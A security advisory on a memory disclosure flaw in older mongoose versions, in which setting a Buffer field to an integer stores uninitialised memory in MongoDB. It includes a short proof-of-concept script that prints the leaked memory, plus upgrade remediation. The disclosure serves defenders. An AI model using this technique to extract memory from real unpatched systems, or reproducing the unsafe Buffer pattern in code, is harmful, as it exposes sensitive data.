## Overview
A potential memory disclosure vulnerability exists in mongoose.
A `Buffer` field in a MongoDB document can be used to expose sensitive
information such as code, runtime memory and user data into MongoDB.

### Details
Initializing a `Buffer` field in a document with integer `N` creates a `Buffer`
of length `N` with non zero-ed out memory.
**Example:**
```
var x = new Buffer(100); // uninitialized Buffer of length 100
// vs
var x = new Buffer('100'); // initialized Buffer with value of '100'
```
Initializing a MongoDB document field in such manner will dump uninitialized
memory into MongoDB.
The patch wraps `Buffer` field initialization in mongoose by converting a
`number` value `N` to array `[N]`, initializing the `Buffer` with `N` in its
binary form.

#### Proof of concept
```javascript
var mongoose = require('mongoose');
mongoose.connect('mongodb://localhost/bufftest');

// data: Buffer is not uncommon, taken straight from the docs: http://mongoosejs.com/docs/schematypes.html
mongoose.model('Item', new mongoose.Schema({id: String, data: Buffer}));

var Item = mongoose.model('Item');

var sample = new Item();
sample.id = 'item1';

// This will create an uninitialized buffer of size 100
sample.data = 100;
sample.save(function () {
    Item.findOne(function (err, result) {
        // Print out the data (exposed memory)
        console.log(result.data.toString('ascii'))
        mongoose.connection.db.dropDatabase(); // Clean up everything
        process.exit();
    });
});
```

## Remediation
Upgrade `mongoose` to version >= 3.8.39 or >= 4.3.6.

If a direct dependency update is not possible, use [`snyk wizard`](https://snyk.io/docs/using-snyk#wizard) to patch this vulnerability.

## References
- https://github.com/Automattic/mongoose/issues/3764
- https://github.com/ChALkeR/notes/blob/master/Lets-fix-Buffer-API.md#previous-materials
- https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md
